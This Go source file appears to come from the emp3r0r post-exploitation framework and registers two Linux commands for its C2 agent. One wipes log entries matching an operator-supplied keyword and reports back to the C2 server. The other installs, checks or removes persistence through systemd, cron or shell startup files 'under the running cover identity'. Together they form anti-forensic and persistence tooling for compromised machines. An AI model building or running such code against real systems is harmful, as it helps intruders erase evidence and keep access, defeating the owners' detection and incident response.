//go:build linux

package handler

import (
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/spf13/cobra"
)

func platformCommands(cmd *cobra.Command) {
	// !clean_log --keyword <keyword>
	cleanLogCmd := &cobra.Command{
		Use:     def.C2CmdCleanLog,
		Short:   "Clean logs",
		Example: "!clean_log --keyword <keyword>",
		GroupID: "linux",
		Run:     runCleanLogLinux,
	}
	cleanLogCmd.Flags().StringP("keyword", "k", "", "Keyword to clean logs")
	cmd.AddCommand(cleanLogCmd)

	// !persist [install|status|remove] --method <auto|systemd|cron|shellrc>
	// Explicit operator-ordered persistence, never automatic: installs
	// user-level autostart under the running cover identity. See
	// persist_linux.go.
	persistCmd := &cobra.Command{
		Use:     def.C2CmdPersist,
		Short:   "Persistence: install/status/remove user-level autostart",
		Example: "!persist install --method auto | !persist status | !persist remove",
		GroupID: "linux",
		Run:     runPersist,
	}
	persistCmd.Flags().StringP("method", "m", "auto", "Persistence mechanism: auto|systemd|cron|shellrc")
	cmd.AddCommand(persistCmd)
}

// runCleanLogLinux implements: !clean_log --keyword <keyword>
func runCleanLogLinux(cmd *cobra.Command, args []string) {
	keyword, _ := cmd.Flags().GetString("keyword")
	if keyword == "" {
		c2transport.NotifyC2(cmd, "Error: args error: keyword is required: %s", args)
		return
	}
	err := modules.CleanAllByKeyword(keyword)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}
	c2transport.NotifyC2(cmd, "%s", "Done")
}
